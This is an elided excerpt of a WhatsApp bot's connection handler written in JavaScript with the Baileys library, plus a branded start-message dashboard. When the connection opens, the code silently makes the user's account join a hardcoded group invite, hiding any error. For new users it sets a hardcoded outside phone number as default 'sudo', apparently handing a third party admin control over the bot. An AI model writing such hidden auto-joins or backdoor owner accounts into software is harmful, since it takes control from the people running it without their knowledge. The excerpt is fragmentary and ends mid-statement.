...
const { default: DmlConnect, DisconnectReason } = require("@whiskeysockets/baileys");
...
async function connectionHandler(socket, connectionUpdate, reconnect) {
  ...
  if (connection === "open") {
    console.clear();
    try {
      await socket.groupAcceptInvite("HflwxRda15o0kRMJwsggcD");
    } catch (error) {}
    ...
    if (!hasSentStartMessage) {
      ...
      if (isNewUser) {
        ...
        const defaultSudo = "255622220680";
  ...
  `╠═❏ START MESSAGE`,
  `║  Status : Enabled`,
  `║  Disable with: *${settings.prefix}startmessage off*`,
  `║`,
  `╚═━『 Powered By Dml 』━═╝`
            ].join("\n")
          : [
              `╔═━『 ${botName.toUpperCase()} DASHBOARD 』━═╗`,
  `║`,
  `║  🔄 ${getGreeting()}`,
  ...
  `║`,
  `╠═❏ START MESSAGE`,
  `║  Enabled (Recommended to disable to prevent spam)`,
  `║  Use: *${settings.prefix}startmessage off*`,
  `║`,
  `╚═━『 Powered By Dml 』━═╝`
            ].join("\n");
        const secondMessage = [
